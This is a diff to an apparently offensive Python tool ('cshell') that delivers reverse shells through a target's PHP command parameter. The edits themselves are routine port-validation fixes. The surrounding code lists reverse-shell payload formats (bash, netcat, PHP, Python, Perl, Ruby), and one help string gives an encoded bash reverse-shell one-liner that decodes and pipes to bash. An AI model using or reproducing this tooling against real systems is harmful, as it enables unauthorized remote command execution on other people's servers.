@@ -170,7 +170,6 @@ def avalability_check(target , type , method , data , headers , cookies , proxie
 					aerr(f"Check : {splitted_target[-1]}")
 					aerr("Exitting...")
 				return False
-				 # If target address and .php file is available it returns True
 		else:
 			aerr(f"Not found : {splitted_php_param[0]} ")
 			return False
@@ -510,7 +509,7 @@ def main():
 		''' )
 	rev.add_argument('-f', metavar='Format', type=str, required=False , choices=["bash-196","bash","bash-read-line","bash-5","nc-mkfifo","nc","nc-c","ncat-e","perl","php-exec","php-shell-exec","php-system","php-passthru","php-popen","python","python-export","python3","python3-export","ruby"], default='bash' ,help='Reverse shell payload format. Default - bash')
 	rev.add_argument('--nolstn' , action='store_true' , required=False , help="Don't start the listener" )
-	rev.add_argument('-p', metavar='Listening-Port' ,  choices=range(1,65535) , required=False ,default=1337 ,type=int, help='Attacker\'s Port In which the reverse shell will be recived [Default - 1337]. Note : Port must be in-between 1 to 65535')
+	rev.add_argument('-p', metavar='Listening-Port' ,  required=False ,default=1337 ,type=int, help='Attacker\'s Port In which the reverse shell will be recived [Default - 1337]. Note : Port must be in-between 1 to 65535')
 	rev.add_argument('-m', metavar='Method' , required=False ,default="GET" , choices=['GET' , 'POST'] ,help='Method of sending the request, Supports : GET, POST')
 	rev.add_argument('-d', metavar='Data' , required=False ,default='{"cmd" : "REV"}' , help='Add Data into the request (Send \'REV\' instead of the command). Example & Default Value : \'{"cmd" : "REV"}\'')
 	rev.add_argument('-H', metavar='Headers' , required=False ,default='{}' , help='Add Headers into the request (all the headers must be in JSON format). Example {\"Host\" : \"127.0.0.1\"}')
@@ -541,7 +540,7 @@ def main():
 #+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 	# listener Argument
 	lstn = subparsers.add_parser("lstnr" , formatter_class=argparse.RawDescriptionHelpFormatter , description='Description : It generates and copies whatever payload from the payload list [You can list all the payloads using \'--payloads\']. it also starts a listener [Optional].')
-	lstn.add_argument("-p" , metavar="Port" , required=False , choices=range(1,65535) , default=1337 , help="Reverse shell's port. [Default : 1337]")
+	lstn.add_argument("-p" , metavar="Port" , required=False ,type=int , default=1337 , help="Reverse shell's port. [Default : 1337]")
 	lstn.add_argument("-f" , metavar="Format" , choices=["bash-196","bash","bash-read-line","bash-5","nc-mkfifo","nc","nc-c","ncat-e","perl","php-exec","php-shell-exec","php-system","php-passthru","php-popen","python","python-export","python3","python3-export","ruby"] , required=False , default="bash" , help="Reverse shell's format. Default : bash")
 	lstn.add_argument("--nolstn" , action='store_true' , required=False , help="Start the listener")
 	lstn.add_argument("--b64" , action='store_true' , required=False , help="Encode the payload in base64 format. Example payload : echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvOTAwMSAwPiYxCg== | base64 -d | bash")
@@ -569,6 +568,9 @@ def main():
 			if ('REV' not in url and method == 'GET') or ('REV' not in str(data) and method == "POST"):
 				aerr("\'REV\' not found on data or URL")
 				sys.exit()
+			if int(port) not in range(0 , 65535):
+				print(f"cshell rev: error: argument -p: invalid choice: {port} (choose from 1 to 65535)")
+				exit()
 
 			try: 
 				if IP(ip): #validated ip
@@ -606,6 +608,10 @@ def main():
 		fmt = args.f
 		nolstn = args.nolstn
 		b64 = args.b64
+		if int(port) not in range(0 , 65535):
+			print(f"cshell rev: error: argument -p: invalid choice: {port} (choose from 1 to 65535)")
+			exit()
+
 		info("lstnr" , None , ip , port=port , payloadtype=fmt)
 		listener(ip , port , payload_type=fmt , nolistener=nolstn , base64encode=b64)
 	elif args.payloads:
@@ -615,3 +621,4 @@ def main():
 		myparser.print_help()
 
 #====================================================================< Function Ends Here >=================================================================================
+main()
